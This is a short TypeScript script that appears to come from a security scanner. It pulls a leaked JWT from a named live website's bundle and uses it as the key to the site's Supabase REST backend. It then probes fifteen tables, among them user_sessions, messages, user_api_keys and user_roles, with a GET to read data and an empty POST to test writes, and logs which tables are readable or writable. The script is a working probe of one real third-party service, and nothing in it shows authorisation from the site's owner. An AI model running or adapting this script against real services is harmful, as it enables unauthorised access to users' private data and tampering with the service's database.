import { scanUrl } from "../src/scan/scanner.js";

function b64urlJson(part: string): Record<string, unknown> {
  const pad = part + "=".repeat((4 - (part.length % 4)) % 4);
  return JSON.parse(
    Buffer.from(pad.replace(/-/g, "+").replace(/_/g, "/"), "base64").toString("utf8"),
  );
}

const report = await scanUrl("https://aureonai.app/");
const jwt = report.findings.find((f) => f.patternId === "jwt")!.value;
const ref = String(b64urlJson(jwt.split(".")[1]!).ref);
const base = `https://${ref}.supabase.co/rest/v1`;
const headers = {
  apikey: jwt,
  authorization: `Bearer ${jwt}`,
  accept: "application/json",
};

// Names leaked by PostgREST hints + bundle
const tables = [
  "user_sessions",
  "account_activity_log",
  "page_view_events",
  "profiles",
  "messages",
  "projects",
  "predictions",
  "user_roles",
  "asher_operators",
  "asha_datasets",
  "user_api_keys",
  "asha_models",
  "asha_runs",
  "asher_jobs",
  "operators",
];

console.log("Table\tGET\tPOST\tNote");
for (const table of tables) {
  const getRes = await fetch(`${base}/${table}?select=*&limit=1`, { headers });
  const getBody = (await getRes.text()).slice(0, 100).replace(/\s+/g, " ");

  const postRes = await fetch(`${base}/${table}`, {
    method: "POST",
    headers: { ...headers, "content-type": "application/json", prefer: "return=minimal" },
    body: "{}",
  });
  const postBody = (await postRes.text()).slice(0, 80).replace(/\s+/g, " ");

  const getNote =
    getRes.status === 200
      ? getBody === "[]"
        ? "readable(empty)"
        : "readable(DATA)"
      : getBody.slice(0, 60);
  const postNote =
    postRes.status === 201 || postRes.status === 200
      ? "WRITE_OK"
      : postRes.status === 401 || postRes.status === 403
        ? "write_denied"
        : `write_${postRes.status}`;

  console.log(`${table}\t${getRes.status}\t${postRes.status}\t${getNote} | ${postNote} ${postBody}`);
}
